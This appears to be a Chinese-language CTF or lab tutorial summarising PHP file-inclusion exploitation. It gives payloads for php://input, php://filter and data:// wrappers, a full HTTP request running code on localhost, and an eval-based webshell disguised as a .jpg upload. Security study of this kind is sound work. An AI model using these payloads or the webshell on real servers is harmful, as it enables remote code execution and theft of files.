## 一些常见的文件包含漏洞的利用技法总结.

文件包含漏洞在服务器端代码中主要以下述形式的$php$代码呈现:

```php+HTML
/*demo.php*/
<?php
    include($_GET['action']);
?>

```

这里我们给出一些利用漏洞的方法.

### 1.php:://input伪协议的利用

我们可以利用$php$为协议, 一般在POST参数中构造我们想要注入的$php$语句.

###### GET 参数：

```http
/?action=php://input
```

###### Post 参数:

```php+HTML
<?php system("dir"); ?>
```

###### 或者:

```php+HTML
<?php echo file_get_contents("../../flag.txt");?>
```

###### http形式的完整注入payload如下:

```http
POST /labs/IncludeAttack/demo.php/?action=php://input HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

<?php echo file_get_contents("../../flag.txt");?>
```

在这里, 语句

```php
file_get_contents('php://input');
```

用于直接将POST参数本身作为字符串赋值或者回显.

#### 2.结合文件上传漏洞利用

在文件上传漏洞中,我们构造木马$virus.php$:

```php
/*virus.php*/
<?php
    eval($_POST['pwd']);
?>
```

在上传过程中捕获数据包,将后缀改为 .jpg 从而绕过前端的检查, 在靶机/ 目标服务器中我们有了一份可执行的病毒文件.

我们构造payload:

###### GET参数

```http
/?action=virus.jpg
```

###### POST参数

```php
pwd=system("dir");
// or pwd=system("ls -la");
// or pwd= echo file_get_contents("../../flag.txt");
```

#### 3.php://filter伪协议的利用

###### GET 参数

```http
php://filter/read=convert.base64-encode/resource=../../flag.txt
```

 回显内容是该路径下文件的base64加密格式.

#### 4.任意可执行文件注入

我们在GET参数中直接注入我们想让服务器执行的php脚本, 将特殊字符替换为 %ord(byte)的格式来解析从而避免闭合问题等.

注意GET参数必须是url编码格式下的php代码.

###### GET 参数

```http
// data: text/plain,<?php system("dir");?>
/?action=data%3a+text/plain,<%3fphp+system+%28"dir"%29%3b+%3f>
```

